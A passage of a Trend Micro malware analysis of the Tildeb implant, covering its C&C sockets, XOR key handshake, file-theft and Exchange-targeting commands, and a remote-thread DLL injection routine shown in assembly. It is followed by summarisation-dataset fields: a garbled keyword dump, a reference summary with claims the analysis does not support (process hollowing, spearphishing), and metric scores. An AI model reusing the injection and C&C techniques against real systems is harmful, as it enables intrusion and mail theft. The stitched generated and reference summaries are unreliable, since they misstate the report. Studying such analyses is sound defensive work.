cleanup_thread may acquire it.2The release of the mutex object and the trigger of the cleanup process carried out by the cleanup_thread happen when Tildeb:\uf0b7 Fails to receive data from the C&C server (if the number of bytes received is 0). \uf0b7 Fails to create a process/execute a file (control command 0x20). \uf0b7 Successfully acquires the mutex object (if it is signaled by other thread); this is control command-dependent.When the cleanup_thread is created, it first attempts to set the thread\u2019s priority to run only when the system is idle using the API SetPriorityClass(hThread, IDLE_PRIORITY_CLASS). However, the usage of this API in the context of the thread is not correct, as this pertains to process priority and not threads. The proper API would have been SetThreadPriority (hThread, THREAD_PRIORITY_IDLE). Therefore, the thread priority level will be that of the process thread priority, which is THREAD_PRIORITY_NORMAL. This mistake is present in every thread created by the implant.After setting the thread's priority, it goes into a while loop where the conditional exit is controlled via a global flag setting, which we\u2019ve referred to as wayout_flag (initially this flag is set to 0). Inside the loop, it sleeps for 15 seconds on every iteration. To exit the while loop:\uf0b7 The state of the mutex object must be anything other than signaled. \uf0b7 More than 15 minutes had passed since the implant has started (this is also dependent on theup_time value).Once outside the while loop, it checks again if less than 15 minutes have passed. If so, it terminates the cleanup thread. Otherwise, it proceeds to close available handles, delete a temp file, shut down and close sockets, and terminate the process, as shown in Figure 1.Accordingly, the cleanup thread functions as a watchdog. If nothing happens that would influence its behavior in less than 15 minutes, the implant cleans after itself and is terminated.The main process thread signals the cleanup thread via the pseudocode (shown in Figure 2), which also alters the process main thread\u2019s continuous operation. The process thread first attempts to acquire the mutex and sets the wayout_flag flag if it is in a non-signaled state. Otherwise, it updates the up_time variable value with the current time, releases the mutex (thus becoming signaled for the cleanup thread to acquire it if possible), and then checks if the number of bytes received from the server is 0. If so, it sets the wayout_flag flag. As shown in Figure 2, the main process thread also goes through a similar cleanup procedure when it fails to receive data from the server by setting the wayout_flag flag, causing it to terminate itself.Note that Tildeb is not equipped with any persistence mechanism. It is unlikely that one will be created considering what the cleanup code does.3{ if (WaitForSingleObject(h_nowMutex, 10s)) { elapsed_time = (current_time() - up_time); if (elapsed_time >= 15m) { if (elapsed_time < 15m) { ms_exc.registration.TryLevel = 0; shutdown(notcreated_socket, SD_BOTH); CSocket::Close(&CSocket_success); return 0;Figure 1: cleanup_thread pseudocode{ if (WaitForSingleObject(h_nowMutex,10s)) { bytes_read = recv_from_server(&rec_data); send_data_to_server(&ss, aOk, 3 u, 0); sleep(3s); shutdown(notcreated_socket, 2); CSocket::Close(&ss); return x;Figure 2: Main process cleanup and threadsynchronization pseudocodeNetwork Communications All of the network sockets created to communicate with the C&C server is carried over the TCP protocol. Tildeb may establish either an ingress or egress connection with the server depending on which connection is established successfully. It uses the MFC Classes CAsyncSocket and CSocket for all network communications.First, it creates a TCP SOCK_STREAM with the list of events \u201cFD_CLOSE | FD_CONNECT | FD_ACCEPT | FD_OOB | FD_WRITE | FD_READ\u201d. However, there's nothing in the code that checks for these events. Without checking whether the socket is successfully created or not, it attempts to connect to it using the hardcoded IP address 137[.]140[.]55[.]211 over the default port number 25. It\u2019s worth noting that despite the port number assignment, the implant does not communicate over the Simple Mail Transfer Protocol (SMTP).If the connection is successful, it proceeds to set the priority class of the process to NORMAL_PRIORITY_CLASS (no scheduling requirements). It then attempts to disable the Nagle4algorithm for send coalescing using the option TCP_NODELAY for a non-created socket. Additionally, this same, non-existent socket is referenced three more times in the code (all designed to shut it down, making it likely that it's leftover code). It then sends the check-in message Success\\x00 to the server then creates the cleanup_thread thread.If it fails to connect to the socket, it closes it and creates the cleanup_thread thread. It then creates another socket with similar attributes, but for accepting ingress connection over the default port 1608. The socket is created to listen on all network interfaces, expecting to receive the exact check-in message OK*3213* from the server. If the message does not match, the implant bails out.Figure 3 shows how the abovementioned steps are carried out in the code. Worth noting is the use of different classes, CAsyncSocket and CSocket, and the function listen() from the library Ws2_32.dll. It is not clear why these APIs were mixed together to create a socket. Additionally, the return value of the API GetLastError() is never checked for.long lEvent = (FD_READ | FD_WRITE | FD_OOB | FD_ACCEPT | FD_CONNECT | FD_CLOSE); CAsyncSocket::Create(&CSocket_success, 0, lEvent, 0); if (!CAsyncSocket::Connect(&CSocket_success, ip_addr_ar, dst_port_tcp)) { GetLastError(); // the return value is never checked! CSocket::Close( & CSocket_success); if (!CreateThread(0, 0, cleanup_thread, 0, 0, &ThreadId)) { CAsyncSocket::Create(&CSocket_listening, nSocketPort, SOCK_STREAM, lEvent, 0); listen(s, 5); // backlog = max of 5 outstanding connections CSocket::Accept(&CSocket_listening, 0, 0); Dest[0] = 0; CSocket::Receive(&CSocket_listening, Dest, 1024, 0); if (strcmp(Dest, aOk3213)) // \"OK*3213*\" SetPriorityClass(h_process, NORMAL_PRIORITY_CLASS); setsockopt(notcreated_socket, IPPROTO_TCP, TCP_NODELAY, &nd_disable, 4); CSocket::Send(&CSocket_success, aSuccess, 8, 0); // \"Success\\x00\" if (!ThreadId && !CreateThread(0, 0, cleanup_thread, 0, 0, &ThreadId)) { return -1; }Figure 3: Sockets creation - hex-rays decompiler pseudocodeOnce the socket is successfully created and the first plaintext packet is sent or received, Tildeb starts to set up a secure communication channel with the server such that all subsequent traffic is encrypted. To establish such a connection, it first expects to receive a buffer of 132 bytes, which we\u2019ve referred to as R_A. Then, it creates a buffer of 132 bytes with pseudorandom data, which we\u2019ve referred to as S_A. The first 128 bytes are the result of SHA-1 (modified version) hashing of different elements from the system such as cursor position, thread ID, thread times, process ID, memory status, system time, and performance counter among others. The 128 bytes are then compared against a hardcoded blob of 132 bytes. If the last dword value is greater than the last dword value of the hardcoded blob, the buffer is regenerated. This comparison is done backward (from last to first) by comparing a dword value from each buffer at a time until the condition fails. We\u2019ll refer to this comparison as cmp_dw_bckwrd. The last 4 bytes (offsets: [0x88-0x83]) are always zero (this buffer of 132 bytes is first initialized to zero).5Hardcoded blob is: 13 E3 B7 E3 A0 C9 D9 CE 43 70 A4 54 CE 8D 7E C9 B5 B7 FB 86 E1 12 A9 B4 49 A4 96 97 E4 38 DC 2E 2D 1E F1 C9 80 C5 8F 2A 36 B3 07 E3 6B 85 DB 2E 5D 7E B8 39 E7 C9 4F DB 04 14 F3 C2 70 D7 4C 37 C7 54 86 55 F7 8A 31 B8 04 39 7D B5 F0 14 B8 F8 C1 8A 4F 3B A8 89 64 CF 10 82 5C 35 8D 06 16 81 B5 91 3A 17 E7 BC 1E 5B 44 C9 C6 D5 40 EB 74 D7 D6 2D B1 4F CE 29 00 A7 70 80 45 AB 7E 8F CF 2D 00 00 00 00Note that all of the blobs of bytes are stored as strings in the code and in the reverse order of what\u2019s shown. Before use, each of them is converted to hex and then the bytes\u2019 order is reversed to look like the aforementioned blob.The S_A buffer is further modified, and similar comparisons are done on it (with the fixed blob 02 00 00 00 00), and then sent to the server. The R_A buffer is then modified using the 128 pseudorandom bytes generated earlier for S_A and the blob 02 00 00 00 00.Later, the implant generates a seed key of 256 bytes (which we\u2019ve referred to as Se_Ke), considering the modified R_A buffer. It then receives a buffer of 132 bytes from the server, which we\u2019ve referred to as R_B. This buffer will then be modified with the hardcoded blob 4B A0 00 00 00 00 00 00 using the hardcoded \u201crandom\u201d blob of 132 bytes:81 A6 B8 DB F3 55 4C B7 90 7A D9 FF 5C 4A ED C4 F8 94 5B EE 0A 32 DE A4 8B C3 40 60 BE 95 C7 67 43 AB 19 E3 23 DE EA 8E 92 24 4D ED 3C 05 FA C3 9E 4F 86 2F B7 AF 0B AD E6 D7 67 82 44 A7 7B 10 0C EA AB F5 88 9D E8 45 E3 DC 72 19 F6 75 19 07 50 0E 91 E4 05 CC 1D 11 FC CC 75 64 DA 10 A2 15 31 3D 1D 85 49 EB D2 74 88 7F 20 90 0E 86 58 7F 75 13 38 35 00 80 D2 20 73 0C 47 8F BD AD C9 E2 00 00 00 00Finally and for verification, it compares both the S_A and R_B buffers. Both have to match to send the status message Success\\x00 (this is different from the check-in request described earlier). Otherwise, it sends the message Error\\x00 to the server. In case the comparison fails, the implant bails out. These messages are sent XOR-encrypted with every key byte being unique. The generated key is dependent on the seed key Se_Ke. Subsequently, all further communications are XOR-encrypted.In a nutshell, this exchange of packets demonstrates the sharing of what looks like session keys that are client-server dependent. Each established TCP session with the server would generate a different set of encryption and decryption keys. Nevertheless, since only the XOR binary operator is used for encryption and decryption, having prior knowledge on the nature of the data being exfiltrated or received makes it possible to decrypt it.Figure 4 shows the code responsible for sending encrypted traffic. Every buffer to be sent is first allocated on the heap, encrypted, sent, and then freed from memory. From a forensics standpoint, and memory analysis in particular, this makes it hard to collect such evidentiary data. However, this is not the case when receiving data from the server. It is rather decrypted and consumed without any attempt to clear it from the memory or disk.6{ result = VirtualAlloc(0,dwSize,MEM_COMMIT,PAGE_READWRITE); qmemcpy(result, data, dwSize); for (i = 0; i < dwSize; ++i) { buffer[i] ^= get_key(Se_Ke); } bytes_sent = CSocket::Send(hSocket,buffer,dwSize,flag); VirtualFree(buffer, 0, MEM_RELEASE); }Figure 4: send function - encrypted channel \u2013 hex-rays decompiler pseudocodeAfter setting up a secure communication channel, Tildeb is ready to receive control commands to perform various malicious activities on the infected system. Figure 5 illustrates the process of establishing a successful connection with the remote server.7Figure 6: How Tildeb establishes a successful connection8The Hardcoded IP Address 137[.]140[.]55[.]211 There is an interesting blunder in the way the IP address is hardcoded. It ends with 3-space characters the IP address on specific versions of Windows OS works correctly but fails on others. There is a technical justification for this behavior.As noted earlier, the implant uses the MFC library for all network communications. To connect to the IP address, it uses the MFC API CAsyncSocket::Connect() located in the library mfc42.dll. Since MFC classes are just C++ wrappers for Windows APIs, the actual implementation of this function is in the Windows ntdll.dll library on, for example, Windows XP(SP3) and other operating systems. The figure below shows the steps taken to reach the core implementation (for mfc42.dll, File Version: 6.02.8073.0):{mfc42.dll}{ws2_32.dll}{ntdll.dll}\u2022CAsyncSocket::Connect()\u2022inet_addr()\u2022RtlIpv4StringToAddressA()CSocket::ConnectHelper()_{mfc42.dll}->CAsyncSocket::ConnectHelper()_{mfc42.dll}->connect()_{WSOCK32.dll}Figure 6: CAsyncSocket::Connect() API implementation sequence (Windows XP; 32-bit)Figure 6 shows the functions that get called in an attempt to convert \u201ca string containing an IPv4 address dotted-decimal address into a proper address for the in_addr structure\u201d. And as per Microsoft Developer Network\u2019s (MSDN) documentation on the inet_addr() function, passing \" \" (a space) to the inet_addr function will return zero. In actuality, the inet_addr() function first checks if the first character in the passed string is a space character. If so, it checks if the next character in the string is the null terminated character \\x00. If not, it proceeds to call the ntdll function RtlIpv4StringToAddressA(), which is responsible for parsing, sanitizing, and converting the passed string into a proper binary IPv4 address in network order.RtlIpv4StringToAddressA() checks if every character is in American Standard Code for Information Interchange (ASCII) or a digit. If it is in ASCII, it checks if it is the character \\x2e (.). After a successful conversion, the Terminator parameter, which \u201creceives a pointer to the character that terminated the converted string,\u201d returns the space character as the terminating character. The code that follows in the function inet_addr() then checks whether it is the null \\x00 terminating character. If not, it checks whether it is an ASCII character; if not, it fails. Otherwise, it continues to check if it is a space character. If so, it returns successfully; otherwise, the function fails.It is important to note that what contributes to the successful conversion in this case is the fact that the Strict parameter of RtlIpv4StringToAddressA() is set to false. It wouldn\u2019t make sense otherwise in the context of Tildeb\u2019s operation. MSDN defines the Strict parameter as follows: \u201cA value that indicates whether the string must be an IPv4 address represented in strict four-part dotted-decimal notation. If this parameter is TRUE, the string must be dotted-decimal with four parts. If this parameter is FALSE, any of four possible forms are allowed, with decimal, octal, or hexadecimal notation.\u201dThis also works with Windows NT 4.0. The function inet_addr() has the actual similar implementation of RtlIpv4StringToAddressA(), but is less sophisticated.9For Windows XP, the MFC\u2019s Connect() function works properly. However, this is not the case for Windows 7. Figure 7 shows the chain of function calls it takes to actually connect to the IP/domain address (this is for mfc42.dll, File Version: 6.6.8063.0). Not every visited function/API is shown.1 \u2022 {mfc42.dll}CAsyncSocket::Connect()2 \u2022 {ws2_32.dll}getaddrinfo()3 \u2022 {ws2_32.dll}GetAddrInfoW()4 \u2022 {ws2_32.dll}5 \u2022 {ntdll.dll}6 \u2022 {ws2_32.dll}7 \u2022 {ws2_32.dll} \u2022 ConvertIp6StringToAddress()RtlIpv6StringToAddressExW()GetIp4Address() -> RtlIpv4StringToAddressW()LookupAddressForName()Figure 7: CAsyncSocket::Connect() API implementation sequence (Windows 7 ; 32-bit)As shown in Figure 7, the chain of calls is different from that of Windows XP, as the file version of the MFC library file is different as well. The getaddrinfo() function is more sophisticated at accounting for different scenarios and more. The code within the function GetIp4Address() that\u2019s responsible for checking the Terminator\u2019s parameter value is notable. After successfully calling the function RtlIpv4StringToAddressW(), GetIp4Address() checks the Terminator value if it is the null character \\x00 and only this character. If so, the function returns 1 (success). If it is anything other than \\x00, the function fails, which is the case in this implant, that is, \\x20. In this case, the setting of the Strict parameter doesn\u2019t matter even if it's set to true.Control Commands The core of Tildeb\u2019s functionality lies in each of the control commands it supports. After establishing a secure connection with the C&C server, it goes into an infinite loop waiting to receive control commands. The receive function expects a buffer with a maximum length of 4194304 bytes. If no bytes are received from the server, it sets the flag wayout_flag. This leads to exiting the infinite loop, starting the cleanup process, and then eventually terminating itself.Tildeb supports a plethora of control commands, all in binary format. All communications are encrypted.There are also status messages that Tildeb sends to the server upon attempting to complete a given task/command. For example, when it receives a control command, or when attempting to get a handle to a file/mailslot, it sends the message .\\x00 (a dot followed by the null terminating character) to the server after it successfully completes any of them. In case it fails, it sends the message Error\\x00.10Other analogous messages are sent to the server as well. The implant uses specific error codes represented as decimal values that it communicates back to the server upon failing to execute some fine- grained operations, and in particular while attempting to inject code into any of the Exchange Server processes. Furthermore, it sends the message ?\\x00 (a question mark) to the server if it receives an unrecognizable control command.The following is a detailed description of each of the commands (in no particular order):\uf0b7 0x403: Deletes a file on the system using the DeleteFileA API.\uf0b7 0x500: Sends the word value 0x2e00 to the server. It expects to receive a buffer of 4 bytes, and if it fails (that is, no bytes were received), it sets the flag wayout_flag to 1. Otherwise, it sends back the same 4 bytes it received from the server. This command functions as a ping-pong check, ensuring that the connection with the server is healthy.\uf0b7 0x1000: Sets the flag wayout_flag to 1 for implant termination, and then sends the messageOk\\x00 to the server.\uf0b7 0x401: Uploads a file to the server using C-runtime functions. It works by first getting the filenamefrom the server, retrieving the size of the file on the system, and then sending it to the server. It then expects to receive data from the server. If the first byte in the payload is 0x2e, it uploads the file in question to the server (0x200 elements of size, 1 byte at a time), until the end-of-file is reached. If it is unable to get a handle to the file, it sends the dword value 0x00000000 (indicating the size) to the server.\uf0b7 0x400: Gets a list of files and folders in a given directory including current date and time,hostname, and files names with their last changed/modified attributes among others. It is saved to the disk in a temporary file, uploaded to the server, and then deleted. The upload function logic is the same as in control command 0x401. However, the difference is that this one uses Windows APIs instead of C-runtime functions. The following is an example of the temporary file\u2019s content:Collected on <hostname>, Sat Nov 24 21:37:16 2018 . Listing directory C:\\interpol\\*.* Sat Nov 24 21:35:09 2018 < DIR > . Sat Nov 24 21:35:09 2018 < DIR > Sun Jan 15 22:40:04 2012 1574 john_galt.pem Sun Jul 22 23:25:58 2012 < DIR > cia Sat Feb 25 23:43:54 2012 6102 eula.txt Sun Jul 22 23:25:54 2012 < DIR > fbi Sun Jul 22 23:52:42 2012 3249 us.cfg Tue Jul 17 05:32:14 2012 1002496 ru.exe Sun Jun 12 22:09:18 2011 2206720 cn.dllIn terms of how the temporary file is created, it first attempts to get the path to the installed MS ExchangeServer Mailbox from the registry. This is done by querying the Value of the Working Directory registry value name located under the Registry Key: HKLM, SubKey, System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersSystem. The value of the parameter Working Directory holds the path to MS ExchangeServer Mailbox. If successful, it creates a temporary file in the said directory/path under the name tmp<uuuu>.tmp (<uuuu> is an unsigned integer based on the current system time). Otherwise, it creates the file in the current11user\u2019s temporary folder under the same name. The created file is meant for writing, with temporary storage and sequential scan.\uf0b7 0x380: Sets MS Exchange \u201cBackground Cleanup\u201d Registry Value with a value received from theserver, then sends out the old value. The said value is located under the Registry Key HKLM, SubKey: System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersPrivate. The background cleanup process is responsible for recovering empty space used by attachments, deleted folders, and messages. The Registry ValueName Background Cleanup value (in milliseconds) controls at which rate this process\u2019 task runs.\uf0b7 0x20: The primary function of this control command follows several steps:1. 2.It attempts to create a temporary file just as in control command 0x400. It checks if a conditional flag is set to true, which it initially is. Then, it concatenates the path it retrieved in the first step with the server response value. For example, the path might look like %temp%\\<server_response>.2.1 It copies the final path derived in the second step into a global variable,which we\u2019ve referred to as fname_s. This variable will be passed into the code injection function.2.2 The conditional flag is set to 0. Thus, this flag is meant to be set onlyonce during the implant\u2019s runtime life.2.3 If the conditional flag is not set, it would only concatenate the path itretrieved in the first step with the server response value.3.4.5.It downloads data from the server and saves it into the file (as binary) created in the first step. The downloaded file is expected to be a cabinet-compressed (.cab) file. It creates a process of the Windows expand utility for decompressing the file downloaded in the second step under a file name received from the server in the same directory of the created temporary file. If process creation (step 4) is successful, it deletes the temporary file from the system. Otherwise, it sets the wayout_flag flag to 1 and deletes the temporary file.The rest of the control commands deals mainly with interprocess communications (IPC) using Windows\u2019 mailslots mechanism as well as code injection into specific MS Exchange Server processes. As detailed below, the implant establishes two-way communication using two mailslots. The mailslot it creates or the one it reads from are not referenced in any of the other tools and utilities in the leak. Therefore, it is unknown what the other process is supposed to do, or how it is supposed to run as a process or as a standalone or child process. The following are the two mailslots referenced in the implant:Mailslot name \\\\.\\mailslot\\c12345\\\\.\\mailslot\\c54321Description Tildeb is the client process. Created by another process. Tildeb writes to it. Tildeb is the server process. Created by Tildeb. It reads from it.Mailslots communications are carried over using specific format messages, unique per control command. However, the general layout has the following structure:Format Message Populated '%ld %x',0Ah '%ld %ls ',0'6553 0x400000',0Ah '<control command> <server_response_x> <# type of info.> <\u2026>'12The values 6553 and 0x400000 are hardcoded in the binary. The <control command> value is either hardcoded as per referenced control command or populated dynamically. <server_response_x> is data received from the C&C server. There could be multiple receive requests from the server, which will be concatenated with the previous one.The second line of the format message is unique to each command. Judging by the mailslot name form, the other processes that use those two mailslots has to reside on the same host of Tildeb\u2019s process.\uf0b7 0x300:1. The format message has the following structure:Format Message '%ld %ls ',0Populated'768 <server_response_a> <server_response_b>'Both values under <server_response_a> and <server_response_b> are received in two separate responses from the server. Based on the structure of the code, the value of <server_response_b> could be any of the following: pub.edb, priv.edb, or dir.edb.2. For one-way interprocess communications (IPC), it creates a thread responsible forcontinuously attempting to write the formatted message to an already created mailslot (under the name \\\\.\\mailslot\\c12345) until successfully done so. The said mailslot is never created by Tildeb\u2019s itself. It is unknown what the other process is that might be on the system or on the infected network that created this mailslot. It creates a mailslot under the name \\\\.\\mailslot\\c54321 (the numbers 54321 are in reverse order of the mailslot referenced in the first step), for a maximum size of 4194304 bytes and a time-out value of 30 seconds.3.4. Based on the last server response, it decides which process of MS Exchange Server toinject code into:Server Response Process Name <if no match>STORE.EXE STORE.EXEBased on the server response, it injects code into the respective process. If the server responded with the string dir.edb and after successful code injection, it executes the code in the fifth step.5.6. 7.It receives data from the server and reads from the mailslot \\\\.\\mailslot\\c54321 into a buffer of 1024 bytes. If the first byte from the server response is \\x2e, it attempts to upload the buffer\u2019s content to the server using the same, exact upload function referenced in the control command 0x400. However, the upload function will fail since it expects a handle to the file to be uploaded. However, Tildeb passes the address of the buffer instead. It closes the handle of the mailslot \\\\.\\mailslot\\c54321 and sets its value to zero. It attempts to delete the buffer using the Windows API DeleteFileA. It commits the same mistake, since it is passing the address of the buffer and not a handle to a file.13Below is a brief description of some of the referenced file names and processes of MS Exchange Server in this control command:\uf0b7 The EDB extension is \"Exchange Information Store Database.\" \uf0b7 Prior to MS Exchange Server v5.5, there were three key DB files, and each contained:1. PRIV.EDB: private information store (this is the actual mailbox content). 2. PUB.EDB: public information store (public folder). 3. DIR.EDB: list/directory of users with mailboxes on the server.\uf0b7kmsmdb.edb: Key Management Security DB. This file is associated with MS Exchange Server 5.5, and in particular the Key Management Server.\uf0b7 DSAMAIN.EXE: This is part of active directory management tools. It allows mounting ashadow copy snapshot or backup of the Active Directory DB file ntds.dit. Moreover, it allows browsing the data using standard admin tools such as Active Directory Users and Computers (ADUC) and snap-in.\uf0b7 STORE.EXE: Microsoft Exchange MDB Store, responsible for enabling mail sessions openedby different clients.\uf0b7 0x290 OR 0x291 OR 0x292:The format message has the following structure: '%ld %2x %2x %2x %2x %2x %2x %2x %2x '<control command> <s_r[0]> <s_r[1]> <s_r[2]> ' <s_r[3]> %2x %2x %2x %2x ' The bytes s_r[0], s_r[1], s_r[2] and s_r[3] are received from the server. The last 4 bytes are never set anywhere in the code. Then, it performs steps 2-7 (code is injected into the STORE.EXE process) similar to control command 0x300, but it writes this control command\u2019s formatted string to the mailslot instead.\uf0b7 >= 0x285:The format message has the following structure: Format Message '%ld %2x %2x %2x %2x %2x %2x %2x %2x %2x' '0x285 <s_r[0]> <s_r[1]> <s_r[2]>Populated<s_r[3]> %2x %2x %2x %2x 1'The value 0x285 is hardcoded and it represents the actual control command. The bytes s_r[0], s_r[1], s_r[2] and s_r[3] are received from the server. The bytes highlighted above are never set anywhere in the code. If the control command is > 0x285, formatted string is set to:Format Message '%ld %2x %2x %2x %2x %2x %2x %2x %2x %2x' '<(control command -1)> <s_r[0]> <s_r[1]>Populated<s_r[2]> <s_r[3]> %2x %2x %2x %2x 0'The highlighted bytes are never set anywhere in the code. It performs steps 2-7 (code is injected into STORE.EXE process) similar to control command 0x300, but it writes this control command\u2019s formatted string to the mailslot instead.\uf0b7 0x206 OR 0x207:The format message has the following structure: Format Message '%ld %2x %2x %2x %2x %2x %2x %2x %2x' '<(control command -2)> <s_r[0]> <s_r[1]>Populated<s_r[2]> <s_r[3]> %2x %2x %2x %2x'The bytes s_r[0], s_r[1], s_r[2] and s_r[3] are received from the server. The last 4 bytes are never set anywhere in the code. The first formatted string is populated independently of the second.14The second formatted string (rhs) is concatenated with the first one x (condition value) number of times in a for-loop that keeps on concatenating the second string to the first until the condition evaluates to false. The condition value is received from the server prior to the concatenation. Moreover, on every iteration inside the for-loop, the values of the second string s_r[]are populated with new data from the server.It then performs steps 2-7 (code is injected into STORE.EXE process) as that of control command 0x300, but it writes this control command\u2019s formatted string to the mailslot instead.\uf0b7 0x290 OR 0x291 OR 0x292:The format message has the following structure: '%ld %ls 'Populated'<control command> <server_response> ' Then, concatenates <server_response_b> '<control command> <server_response_a> <server_response_b>' Then concatenate: ' %x %x' '<control command> <server_response_a> <server_response_b> %x <server_response_c>'The highlighted byte is never set anywhere in the code, and the second is received from the server (maximum length of 8 bytes). It then performs steps 2-7 (code is injected into STORE.EXE process) similar to control command 0x300, but it writes this control command\u2019s formatted string to the mailslot instead.\uf0b7 0x280: It downloads a file from the server onto the infected system. The file is saved on diskunder a temporary file name. File path and name is retrieved and constructed in the same way as that of control command 0x400. We've referred to the full path and name of the downloaded file as dwldd_file.The format message has the following structure:Format Message '%ld %2x %2x %2x %2x %2x %2x %2x %2x %s' '<control command> <s_r[0]> <s_r[1]> <s_r[2]>Populated<s_r[3]> %2x %2x %2x %2x <dwldd_file>'The highlighted bytes are never set anywhere in the code. It then performs steps 2-7 (code is injected into STORE.EXE process) similar to control command 0x300, but it writes this control command\u2019s formatted string to the mailslot instead. After step 7, it also deletes the download file dwldd_file.\uf0b7 0x281: The same implementation of the control command 0x280.\uf0b7 0x204: The same implementation of the control commands 0x290, 0x291, and 0x292.\uf0b7 0x203: The same implementation of the control command 0x208 except that the <controlcommand> is hardcoded in the formatted string as 515 instead of being referenced. Additionally, the formatted string is different and has the following structure:'0x203 <server_response_a> <server_response_b>'\uf0b7 0x202: The same implementation of the control command 0x300 except that the <controlcommand> is hardcoded in the formatted string as 514. For the fourth step, code is injected into STORE.EXE process.15\uf0b7 0x201: The same implementation of the control command 0x300, except that the <controlcommand> is hardcoded in the formatted string as 513. For the fourth step, code is injected into the STORE.EXE process. Moreover, the formatted string is as follows (nothing is concatenated with the server response):Format Message '%ld 'Populated'513 'Code Injection Function This function first checks if the available physical memory on the system and the maximum amount of memory the Tildeb process can commit is less than 33554432 bytes (~33.55 Mb). If so, then no attempt at code injection happens, as the following pseudocode snippet shows:GlobalMemoryStatus(&Buffer); if ( Buffer.dwAvailPhys + Buffer.dwAvailPageFile < 33554432 ) { return -4; // error_code To get the process\u2019 (\u2018injectee\u2019) unique process ID, it uses the API NtQuerySystemInformation(), passing it the SystemInformationClass value from SystemProcessInformation. The targeted process is supposed to be running on the system already.It then attempts to get a handle to the process in question by requesting the following list of desired access rights (using the OpenProcess() API): PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, and PROCESS_QUERY_INFORMATION. If unsuccessful, it attempts to acquire them using either of two methods.Before attempting code injection, the implant compares the image base address of the module Kernel32.dll for the same process. One is retrieved via a pseudohandle to the process and the other via the actual process ID. If the base addresses do not match, code injection does not take place. It is unknown why the malware enforces such comparison, or under what scenario it is supposed to fail.The implant retrieves the image base address of the module Kernel32.dll through either of the following two methods:1. Using the API NtQuerySystemInformation(), passing it the SystemInformationClass value fromProcessBasicInformation, which returns the structure _PROCESS_BASIC_INFORMATION. This is done by parsing the structures data members _PEB.Ldr \uf0e0 _PEB_LDR_DATA.InMemoryOrderModuleList \uf0e0 LDR_DATA_TABLE_ENTRY. DllBase.2. Using the API NtQuerySystemInformation(), passing it the SystemInformationClass value fromSystemModuleInformation, which returns the structure RTL_PROCESS_MODULES. This structure is not publicly documented by Microsoft in the MSDN library. However, the malware parses it to locate the ImageBase field.16The second method is only reachable if the process pseudohandle or ID value is zero, which is unclear in this context. Once all checks are passed, it injects the following code into the targeted process:injected_code proc near mov edi, [esp+8+PtrLoadLibraryA] lea eax, [edi+8] push eax // fname_s (path to downloaded module) call dword ptr [edi] // LoadLibraryA mov esi, eax test esi, esi jz short ret_zero push esi call dword ptr [edi+4] // FreeLibrary mov eax, esi injected_code endpThe code above is responsible for loading and freeing a library module downloaded from the server (as shown in control command 0x20) into the address space of the targeted process. Note that the addresses of the APIs LoadLibraryA() and FreeLibrary() are resolved dynamically prior to injection, and then their addresses are injected accordingly.Nothing stands out with respect to the code responsible for injection. It is done by committing a region of memory of size (injected code size (32) + 531 = 563 bytes) within the virtual address space of the targeted process, with the memory protection for the regions to be allocated set to PAGE_EXECUTE_READWRITE. Copying and starting the code into the targeted process is done via the standard APIs WriteProcessMemory(), CreateRemoteThread(), and WaitForSingleObject(hThread, 0xFFFFFFFF).The methods it tries in case Tildeb doesn\u2019t have the specified access rights to the process object are as follows:1.It attempts to add the GENERIC_ALL (the right to read, write, and execute the object) access- allowed Access Control Entry (ACE) to the security identifier of the account named Everyone on the system. Then, it tries to set/update the DACL_SECURITY_INFORMATION (discretionary access control list) for object SE_KERNEL_OBJECT of the targeted process with the new ACE, that is, GENERIC_ALL.If Tildeb is still unable to acquire those access rights after executing this step, it attempts to perform the same action on two other accounts that are Domain Users and the name of the user associated with the current thread.2.If all of the actions in the first step fails, the implant attempts to exploit an unknown escalation-of- privileges (EoP) vulnerability in the driver win32k.sys. This feature targets very specific versions of win32k.sys. It checks for those versions by comparing the CRC-32 checksum of the file on the infected system against the following list of hardcoded checksums:17Hardcoded CRC-32 Checksum MS Windows NT 4.0 (Service Pack 3) MS Windows NT 4.0 (Service Pack 6a) MS Windows NT 4.0 (Service Pack 6)We were only able to map three of the checksums to their respective OS versions. Moreover, this EoP is attempted only on systems with specific locale (default country). The temporary file ~debl00l.tmp is created in the same directory of the implant, and after exploitation. It includes the following information:ver= <unique value assigned by the implant based on the default country code> ccode=<LOCALE_IDEFAULTCOUNTRY> CRC=<crc-32 checksum value of \u201c%windir%\\system32\\win32k.sys\u201d>18TREND MICROTM RESEARCHTrend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information.Trend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and supporting efforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in vulnerability disclosures, and publishes innovative research on new threats techniques. We continually work to anticipate new threats and deliver thought-provoking research.www.trendmicro.com19 ", "generated_text": "the file; Tildeb; C; 32-Bit; console Windows; commands; the implant; port; AfxWinInit; C&C; the C&C server; the IP address; port; IP; the IP; the IP address; IP/domain address; the C&C server; the IP; a transmission control protocol socket; the port number; a remote access control system; a control server; a Control Plan; the port; the IP address; the IP address; the C&C server; the port; each argument; the first; the second; the third; the port number; the port; an ingress connection; a transmission control protocol socket; the port; the egress connection; the payload; a GET packet; the packet; a GET packet; the port; a command; the IP; the IP address; the egress connection; the IP address; a heap; the backdoor; the GET packet; the RCE module; the mail; the packet; the remote access control system; the network; the port; the first argument; the second argument; the second argument; the port number; the second", "ref_text": "<START-1>The report provides an analysis of the Tildeb malware implant leaked by the Shadow Brokers. Tildeb is a console-based Windows executable compiled in 2000 that accepts command-line arguments. It has no encryption, anti-debugging or persistence mechanisms. Tildeb establishes encrypted TCP communications with a hardcoded command and control server to receive control commands. It can upload and delete files, get directory listings, modify the registry, communicate via mailslots, and inject code into the Exchange Server processes. The implant creates a cleanup thread to remove artifacts if connections fail. It attempts privilege escalation against specific Windows versions using a win32k.sys vulnerability. Tildeb tailors some actions based on the infected system's locale. The report examines Tildeb's command and control communications in depth, including the key exchange, control commands supported, error reporting, and mailslot messaging formats. It analyzes the process hollowing code injection technique employed. There are indications Tildeb may be delivered via spearphishing or run in conjunction with an exploitation framework. The compile timestamp suggests development prior to 2000, but it may have undergone iterations. While the exact targets are unknown, the Exchange Server interactions imply compromise of email environments. <END-1>", "t5/keyword/hint_hit_precision": 0.06349206349206349, "t5/word/hint_hit_recall": 0.026737967914438502, "gpt3/lexical/rouge_rouge1": 0.4041095890410959, "gpt3/lexical/rouge_rouge2": 0.11034482758620688, "gpt3/lexical/rouge_rougeL": 0.2534246575342466, 